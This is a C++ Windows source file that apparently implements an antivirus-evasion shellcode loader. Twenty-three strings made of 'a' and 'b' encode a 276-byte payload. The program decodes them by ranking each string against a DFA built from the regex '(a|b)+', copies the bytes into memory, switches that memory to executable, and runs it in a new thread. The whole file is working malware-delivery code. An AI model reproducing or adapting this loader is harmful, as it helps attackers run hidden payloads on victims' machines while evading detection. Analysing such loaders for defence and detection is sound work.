#include <cstdio>
#include <windows.h>

#include "libdank.h"

#define SHELLCODE_SIZE 276
#define CAPACITY_SIZE 12
#define NUM_CHUNKS 23
#define FIXED_SLICE 100

const char* regex = "(a|b)+";

char* mydata[] = {
  "aaaaababaaababaaaaabaaaaaaaaaaaaaaaaaaaaaaaabbaaaaaabbbabaaabbbbaaaabbbaabaabaaaaabbabaabaaabbbbbbaa",
  "aaaaababaababaaababbabaabaaaabbaababbbabaabaaabbaaababaabaaaabababbaababaaabababaabaababaaaaabaaaaab",
  "aaaaabbbaababaaababbabaabaaaaabaaaaaababaababaaababbabaabaaaaaabbaaaababaababaaababbabaabaaaabbaaaaa",
  "aaaabbaaaaaaaabbaaababaabaaabbaabaabaabbaaababaabbababaababaabaababababbabbbaaaabbbbabaabaaaababaaaa",
  "aaaaabaaaaabaaaabbabbbaabaabbbaaaaababaaaaabaabaaaaaaababbaaaaaaaabaabbbbbaaabbaaaabaabbbbaabababbaa",
  "aaaabaaababbaabaaaaaababaababaaababbabaabaaaababaaababaaaaabababaababbbabbabbbbaaababbaaaaabaaaaaaab",
  "aaaaabaabaaaaaaaaaaaaaaaaaaaaaaaaaaabaaabaaabaaaaaaabaaababbbbabaaaaaaaaaaababaabaaaaabbbbaaabaaaaba",
  "aaaaabaaabaaaaabbaaaabaabaaabaaababbababaaaabbabaaaaaaaaaaababaabaaaabbaabbbabbbabaabbaaaaaabaaaabab",
  "aaaaabaaaaabbbaabaabbbbbbbbbabaabaaaabababbabbbaaabbbbabaaaaaaaaaaababaabaabaabaaaaaabaaaaaabaaababb",
  "aaaabbaaaaaaaabbaaababaabaaabbaabaabaabbaaababaabbabbbababbaaaaaaaababaabaaabaaabaaaaabbabaabaaababb",
  "aaaabbbbaaababbbababbbbaaaaaaabbbaaabbaaaaabaaaaaaababaaaaabaaaabbabbbaabaabbbaaaaababaaaaabbababbaa",
  "aaaaabaaabaaababbaaabbabbaaaabbbababbbabaaabaabbbaababaaababaaaabaaaaabaabaaabaabbaaaaaaaabbabaabbaa",
  "aaaaabaaabaaabaabaaaaaaabbaabaaababbabaaaaababbaabbabbabaaaaaaaaaaababaabaabaabaabaaabaaaaaabaaababb",
  "aaaaaaaaaaababaabaaabaaabaaaaaaaabaabaaababbabaaaaabbbabaaaaaaaaaaababaabaabaaabbbaaabaaaaaabaaababb",
  "aaaaababbaababaaaaabababbaaaabaaaaabababbabaababbaabababbbbaababbaaaabaaaaabababbaaaabaaaaabbbabaaaa",
  "aaaaabaaaaabababbaaabbbaaaaabbbbbbbbababaabaabaaaaabaabaaaaabbbabbaabaaaaabbabaabaaaababbabaabaaaaab",
  "aaaaabaabaaaababbbabbbbbbbbbbbbbbbbbbbbbbbbbabababbbbbbabaabaaabaababaaababbabaabaaaababbabaababbaab",
  "aaaabaaabbabbaaabbababaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbabbbaba",
  "aaaabbabababbbbbbbbbbaaaabbbabbabbbbbaaababbaabbaaabbabbbabaabaaaaabaaaaaaaaaaaaaaaaaaaaaaabaaaaaaab",
  "aaaabbbbbbbbbaabbbabbabbbbabbaabababbabaabbababbbabaabaaaaabaaaababaaabababaaaabbbabbbbaaaaababbbabb",
  "aaaabbbaaaaabbbbbabbbaaaaaaaaaaababaabbbbbaaaaaaabbaaabbbbaaaababaaabbaaabaabaaaaabbabaabaaabbababab",
  "aaaabaaabaababaaaaabababbaabaaaaaaaaabbababaabbabbbbabbbaabaaaabaabbabaaabbbbabbbabbaaaaabababbbabab",
  "aaaaaaaaaaaaabbaabababbbbaaaabbaababaababbbaabbaaabbabbabbaaabbaaaababbaaabbbbabababbbbbbbbbbbabbaba",
};

int main(void) {
  DFA myDfa = DFA::from_regex(regex);
  myDfa.buildTable(FIXED_SLICE);

  PBYTE buf = (PBYTE)VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_COMMIT, PAGE_READWRITE);
  PBYTE p = NULL;
  DWORD tmp = SHELLCODE_SIZE;
  DWORD count = 0;
  HANDLE hThread = INVALID_HANDLE_VALUE;
  BigInteger bi = 0;

  for (int i = 0; i < NUM_CHUNKS; i++) {
    bi = myDfa.rank(mydata[i]);
    count = min(CAPACITY_SIZE, tmp);
    p = bi.to_bytes(count).data();
    memcpy(buf + (i * CAPACITY_SIZE), p, count);
    tmp -= CAPACITY_SIZE;
  }

  VirtualProtect(buf, SHELLCODE_SIZE, PAGE_EXECUTE_READ, &tmp);
  hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);

  WaitForSingleObject(hThread, INFINITE);
  VirtualFree(buf, 0, MEM_DECOMMIT | MEM_RELEASE);

  return 0;
}
